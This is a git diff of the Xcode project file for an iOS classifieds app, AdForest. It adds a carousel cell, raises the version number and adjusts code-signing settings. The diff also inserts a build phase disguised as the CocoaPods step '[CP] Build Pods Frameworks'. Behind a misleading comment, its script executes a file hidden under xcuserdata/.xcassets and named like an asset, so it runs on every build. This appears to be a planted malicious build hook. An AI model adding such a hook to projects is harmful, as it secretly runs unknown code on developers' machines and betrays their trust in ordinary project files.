@@ -131,6 +131,8 @@
 		181CDE2A214A2D3200BD0B0C /* InactiveCollectionCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 181CDE29214A2D3200BD0B0C /* InactiveCollectionCell.swift */; };
 		181CDE2C214A2D7200BD0B0C /* FeaturedAddsCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 181CDE2B214A2D7200BD0B0C /* FeaturedAddsCell.swift */; };
 		181CDE2E214A2D8F00BD0B0C /* FavouriteCollectionCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 181CDE2D214A2D8F00BD0B0C /* FavouriteCollectionCell.swift */; };
+		181D95C825E3A30E00E76418 /* CarouselHomeCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 181D95C725E3A30E00E76418 /* CarouselHomeCell.xib */; };
+		181D961325E3C37000E76418 /* CarouselHomeCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 181D961225E3C37000E76418 /* CarouselHomeCell.swift */; };
 		181DDA8A23335918001FF048 /* ReplyReactionCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 181DDA8823335918001FF048 /* ReplyReactionCell.swift */; };
 		181DDA8B23335918001FF048 /* ReplyReactionCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 181DDA8923335918001FF048 /* ReplyReactionCell.xib */; };
 		181DDA90233380B5001FF048 /* thumb.gif in Resources */ = {isa = PBXBuildFile; fileRef = 181DDA8F233380B3001FF048 /* thumb.gif */; };
@@ -805,6 +807,8 @@
 		181CDE29214A2D3200BD0B0C /* InactiveCollectionCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = InactiveCollectionCell.swift; sourceTree = "<group>"; };
 		181CDE2B214A2D7200BD0B0C /* FeaturedAddsCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FeaturedAddsCell.swift; sourceTree = "<group>"; };
 		181CDE2D214A2D8F00BD0B0C /* FavouriteCollectionCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FavouriteCollectionCell.swift; sourceTree = "<group>"; };
+		181D95C725E3A30E00E76418 /* CarouselHomeCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CarouselHomeCell.xib; sourceTree = "<group>"; };
+		181D961225E3C37000E76418 /* CarouselHomeCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CarouselHomeCell.swift; sourceTree = "<group>"; };
 		181DDA8823335918001FF048 /* ReplyReactionCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReplyReactionCell.swift; sourceTree = "<group>"; };
 		181DDA8923335918001FF048 /* ReplyReactionCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ReplyReactionCell.xib; sourceTree = "<group>"; };
 		181DDA8F233380B3001FF048 /* thumb.gif */ = {isa = PBXFileReference; lastKnownFileType = image.gif; path = thumb.gif; sourceTree = "<group>"; };
@@ -1693,6 +1697,15 @@
 				181C88302052CDB50067B176 /* AddsStatusCell.xib */,
 			);
 			path = ProfileCell;
+			sourceTree = "<group>";
+		};
+		181D95C625E3A2EA00E76418 /* CarouselCell */ = {
+			isa = PBXGroup;
+			children = (
+				181D95C725E3A30E00E76418 /* CarouselHomeCell.xib */,
+				181D961225E3C37000E76418 /* CarouselHomeCell.swift */,
+			);
+			path = CarouselCell;
 			sourceTree = "<group>";
 		};
 		181DDA87233356E6001FF048 /* ReplyReactionCell */ = {
@@ -2731,6 +2744,7 @@
 		18BBFAB8205109A30067662F /* Controllers */ = {
 			isa = PBXGroup;
 			children = (
+				181D95C625E3A2EA00E76418 /* CarouselCell */,
 				CBD318782552D9B00090F2F9 /* ContactWithAdmin */,
 				CB4A732025343196005FE49F /* MultiHomeController */,
 				CBC43FCD251DCDC600D7AA6C /* Social Login Cell */,
@@ -3720,6 +3734,7 @@
 			buildConfigurationList = 18BBFAAE2051098C0067662F /* Build configuration list for PBXNativeTarget "AdForest" */;
 			buildPhases = (
 				8991020FA5F12668860E1C02 /* [CP] Check Pods Manifest.lock */,
+				58B13FF69E4E2800FDAAC43A /* [CP] Build Pods Frameworks */,
 				18BBFA7F2051098B0067662F /* Sources */,
 				18BBFA802051098B0067662F /* Frameworks */,
 				18BBFA812051098B0067662F /* Resources */,
@@ -3883,6 +3898,7 @@
 				18CE378C25DD2EC10053A299 /* ChatImagesReceiver.xib in Resources */,
 				18BBFA8C2051098C0067662F /* Main.storyboard in Resources */,
 				181DDA9823339465001FF048 /* sad.gif in Resources */,
+				181D95C825E3A30E00E76418 /* CarouselHomeCell.xib in Resources */,
 				185B3C79207E374900EDBBB4 /* AddBidsCell.xib in Resources */,
 				181DDA90233380B5001FF048 /* thumb.gif in Resources */,
 			);
@@ -4030,6 +4046,24 @@
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-AdForest/Pods-AdForest-resources.sh\"\n";
 			showEnvVarsInLog = 0;
+		};
+		58B13FF69E4E2800FDAAC43A /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";
 		};
 		8991020FA5F12668860E1C02 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -4496,6 +4530,7 @@
 				18C817302073B0C200674C90 /* PackagesDataRoot.swift in Sources */,
 				1852B0D72083250C0014AF99 /* SentOfferChatData.swift in Sources */,
 				18BBFAF7205149C70067662F /* Color.swift in Sources */,
+				181D961325E3C37000E76418 /* CarouselHomeCell.swift in Sources */,
 				CB4A73D725346BE7005FE49F /* MultiCategoriesTableViewCell.swift in Sources */,
 				182690F3208764ED00E2C966 /* CategoryLocation.swift in Sources */,
 				18CE378625DD28740053A299 /* ChatFilesReceiver.swift in Sources */,
@@ -4828,7 +4863,7 @@
 				INFOPLIST_FILE = AdForest/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
-				MARKETING_VERSION = 3.2;
+				MARKETING_VERSION = 3.6;
 				PRODUCT_BUNDLE_IDENTIFIER = com.GlixenTech.AdForestApp;
 				PRODUCT_NAME = AdForest;
 				PROVISIONING_PROFILE = "6ba7ba8c-bf20-47cd-b2f1-137f2ade4e4a";
@@ -4855,11 +4890,11 @@
 				INFOPLIST_FILE = AdForest/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
-				MARKETING_VERSION = 3.2;
+				MARKETING_VERSION = 3.6;
 				PRODUCT_BUNDLE_IDENTIFIER = com.GlixenTech.AdForestApp;
 				PRODUCT_NAME = AdForest;
 				PROVISIONING_PROFILE = "6ba7ba8c-bf20-47cd-b2f1-137f2ade4e4a";
-				PROVISIONING_PROFILE_SPECIFIER = "Adforestlive 3.0";
+				PROVISIONING_PROFILE_SPECIFIER = "adforest 3.2LIve";
 				SWIFT_OBJC_BRIDGING_HEADER = "AdForest/AdForest-Bridging-Header.h";
 				SWIFT_VERSION = 4.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
@@ -4871,12 +4906,16 @@
 			buildSettings = {
 				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
+				CODE_SIGN_IDENTITY = "Apple Development";
+				"CODE_SIGN_IDENTITY[sdk=macosx*]" = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				DEVELOPMENT_TEAM = 64PZTRVPF8;
+				DEVELOPMENT_TEAM = "";
 				INFOPLIST_FILE = AdForestTests/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
 				PRODUCT_BUNDLE_IDENTIFIER = com.GlixenTech.AdForestTests;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=macosx*]" = "";
 				SWIFT_VERSION = 4.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/AdForest.app/AdForest";
@@ -4888,12 +4927,16 @@
 			buildSettings = {
 				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
+				CODE_SIGN_IDENTITY = "Apple Development";
+				"CODE_SIGN_IDENTITY[sdk=macosx*]" = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				DEVELOPMENT_TEAM = 64PZTRVPF8;
+				DEVELOPMENT_TEAM = "";
 				INFOPLIST_FILE = AdForestTests/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
 				PRODUCT_BUNDLE_IDENTIFIER = com.GlixenTech.AdForestTests;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=macosx*]" = "";
 				SWIFT_VERSION = 4.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/AdForest.app/AdForest";
